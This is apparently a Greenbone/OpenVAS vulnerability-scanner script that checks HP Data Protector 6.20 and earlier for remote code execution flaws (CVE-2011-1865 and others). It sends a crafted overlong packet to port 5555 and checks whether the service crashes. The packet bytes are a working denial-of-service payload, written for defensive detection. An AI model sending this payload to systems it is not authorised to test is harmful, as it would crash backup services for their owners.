# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:hp:data_protector";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902454");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2011-1865", "CVE-2011-1514", "CVE-2011-1515", "CVE-2011-1866");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("HP (OpenView Storage) Data Protector Multiple RCE Vulnerabilities");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("hp_data_protector_installed.nasl");
  script_require_ports("Services/hp_dataprotector", 5555);
  script_mandatory_keys("microfocus/data_protector/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary code or may lead to denial of service conditions.");

  script_tag(name:"affected", value:"HP (OpenView Storage) Data Protector 6.20 and prior.");

  script_tag(name:"insight", value:"Multiple flaws are due to error in 'data protector inet' service
  command which allows remote remote attackers to execute arbitrary code.");

  script_tag(name:"summary", value:"HP (OpenView Storage) Data Protector is prone to multiple remote
  code execution (RCE) vulnerabilities.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17458/");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Jun/552");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Jun/551");

  exit(0);
}

include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit(0);

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

headdata = raw_string( 0x00, 0x00, 0x27, 0xca, 0xff, 0xfe, 0x32,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x32, 0x00, 0x38, 0x00, 0x00,
                 0x00, 0x20, 0x00 );

middata = crap( data:raw_string( 0x61 ), length:10001 );

lastdata = raw_string( 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                 0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                 0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                 0x00, 0x61, 0x00, 0x00, 0x00 );

req = headdata + middata + lastdata;

send( socket:soc, data:req );

close( soc );

sleep( 5 );

soc = open_sock_tcp( port );
if( ! soc ) {
  security_message( port:port );
  exit( 0 );
} else {
  response = recv( socket:soc, length:4096, timeout:20 );
  if( "HP Data Protector" >!< response && "HPE Data Protector" >!< response && "HP OpenView Storage Data Protector" >!< response ) {
    security_message( port:port );
    exit( 0 );
  }
}

close( soc );

exit( 99 );
